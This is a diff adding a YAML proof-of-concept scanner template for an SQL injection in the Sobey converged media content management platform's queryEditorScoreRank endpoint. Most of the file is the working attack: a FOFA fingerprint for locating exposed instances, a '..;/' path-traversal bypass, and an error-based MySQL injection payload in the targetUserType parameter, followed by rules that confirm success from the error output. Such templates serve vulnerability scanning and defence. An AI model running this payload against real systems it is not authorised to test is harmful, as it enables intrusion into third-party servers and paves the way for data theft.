@@ -1,0 +1,17 @@
+id: poc-yaml-sobey-imcmp-queryeditorscorerank-sqli
+info:
+  name: 索贝融合媒体内容管理平台 queryEditorScoreRank SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 索贝融合媒体内容管理平台
+  fofa: body="/Sc-TaskMonitoring/" || header="Sobey"
+variables:
+  t1: random_int(1000,10000)
+  t2: md5(t1)
+requests:
+- method: GET
+  path: /sobey-mchEditor/js/..;/mch/jztEditorScore/queryEditorScoreRank?siteCode=&targetUserType='+AND+GTID_SUBSET(CONCAT(0x7e,(SELECT+(ELT(1709=1709,md5({{.t1}})))),0x7e),1709)+AND+'bckN'='bckN&token=&userCode=admin
+  expression: status_code == 500 && contains(body,"Sobey") && contains(body,".queryEditorScoreRank")
+    && contains(body,`~` + t2 + `~`) && contains(body,"java.sql.SQLException")
+transport: http
